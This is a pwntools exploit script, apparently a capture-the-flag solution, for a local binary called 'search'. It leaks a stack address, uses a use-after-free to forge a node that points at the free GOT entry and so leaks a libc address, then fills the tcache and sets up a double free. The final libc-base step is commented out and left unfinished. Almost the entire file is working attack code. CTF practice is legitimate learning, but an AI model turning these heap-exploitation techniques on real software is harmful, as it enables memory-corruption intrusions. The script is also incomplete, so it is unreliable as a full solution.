from pwn import *

binary = './search-bf61fbb8fa7212c814b2607a81a84adf'
elf = ELF(binary)
context.log_level = 'debug'  # Comment this out for less verbosity
p = process(binary)

# Optional GDB attachment
gdb.attach(p, '''
b *0x00400ad0
#b * malloc
''')

def leak_stack():
    p.sendlineafter(b"Quit\n", b"A"*48)
    p.recvuntil(b" is not a valid number\n")
    
    p.sendline(b"A"*48)
    leak_line = p.recvline()
    
    if b" is not a valid number" in leak_line:
        leak = leak_line.split(b" ")[0][48:]
        if leak:
            return u64(leak.ljust(8, b'\x00'))
    
    log.error("Failed to leak stack address")
    return None

def search_word(size, word):
    p.sendlineafter(b"Quit\n", b"1")
    p.sendlineafter(b"size:\n", str(size).encode())
    p.sendlineafter(b"word:\n", word)
    
def add_sentence(size, sentence):
    p.sendlineafter(b"Quit\n", b"2")
    p.sendlineafter(b"size:\n", str(size).encode())
    p.sendlineafter(b"sentence:\n", sentence)

def leak_libc():
    # 1. Allocate a sentence the same size as a Word node (40 bytes)
    # Word node size is 0x28 (40 bytes) as seen in the code
    # Format: word1 + space + word2 + space + padding
    add_sentence(40, b"A"*12 + b" B " + b"C"*(40-12-3))
    
    # 2. Delete the sentence
    search_word(12, b"A"*12)
    p.sendlineafter(b"(y/n)?\n", b"y")
    
    # 3. Allocate a larger sentence (> 40+16 bytes)
    # This ensures a new chunk is allocated rather than reusing the freed one
    add_sentence(64, b"D"*64)
    
    # 4. Use UAF to search for and delete the first sentence again
    # We search for a null byte which should be at the position of 'B'
    # after the sentence was zeroed in step 2
    search_word(1, b"\x00")
    p.sendlineafter(b"(y/n)?\n", b"y")
    
    # 5. Create a fake node to control the sentence pointer
    fake_node = b""
    fake_node += p64(0x400E90)       # word pointer - pointing to a static string "Enter"
    fake_node += p64(5)              # word length (length of "Enter")
    fake_node += p64(elf.got['free']) # sentence pointer - pointing to GOT entry of free
    fake_node += p64(64)             # sentence size
    fake_node += p64(0)              # next pointer (NULL)
    assert len(fake_node) == 40
    
    # 6. Allocate this fake node on top of the freed chunk
    add_sentence(40, fake_node)
    
    # Clean up any pending output
    
    
    # 7. Search for the word "Enter" to trigger printing of the GOT address
    search_word(5, b"Enter")
    p.recvuntil(b"Found 64: ")
    leak = u64(p.recvline()[:8])
    p.sendlineafter(b"(y/n)?\n", b"n")  # Don't delete it
    
    return leak
def create_double_free():
    # Create 3 sentences of the same size
    add_sentence(56, b"a"*54 + b" d")
    add_sentence(56, b"b"*54 + b" d")
    add_sentence(56, b"c"*54 + b" d")
    
    # Free all 3 sentences
    search_word(1, b"d")
    p.sendlineafter(b"(y/n)?\n", b"y")  # Free sentence_c
    p.sendlineafter(b"(y/n)?\n", b"y")  # Free sentence_b
    p.sendlineafter(b"(y/n)?\n", b"y")  # Free sentence_a
    
    # Create cycle by freeing sentence_b again
    search_word(1, b"\x00")
    p.sendlineafter(b"(y/n)?\n", b"y")  # Free matching sentence (sentence_b)
    p.sendlineafter(b"(y/n)?\n", b"n")  # Don't free sentence_a
    
def fill_tcache():
    # Allocate 7 chunks for tcache
    for i in range(7):
        # Use a simple pattern with a unique character at the end
        filler = b"FILLER" + bytes([65 + i])  # 'A', 'B', 'C', etc.
        filler = filler.ljust(56 - 2, b"X")  # Fill most of the space
        filler += b" Z"  # Add a searchable suffix
        add_sentence(56, filler)
    
    # Free all 7 chunks by searching for Z
    search_word(1, b"Z")
    for _ in range(7):
        p.sendlineafter(b"(y/n)?\n", b"y")  # Free all matches

    
    
# First, leak a stack address
stack_leak = leak_stack()
log.info(f"Stack leak: {hex(stack_leak)}")

# After the stack leak, need to get back to the main menu
p.sendline(b"1")  # Send a valid number to exit the recursive function
p.sendline(b"4")  # Send a valid number to exit the recursive function
p.sendline(b"AAAA")  # Send a valid number to exit the recursive function
# Now leak a libc address
libc_leak = leak_libc()
log.info(f"Libc leak (free GOT): {hex(libc_leak)}")

fill_tcache()
create_double_free()
# Calculate libc base
#libc_base = libc_leak - 0x  # You need to fill in the offset of free in libc
                            # This can be found using `readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep free`
#log.info(f"Libc base: {hex(libc_base)}")

p.interactive()
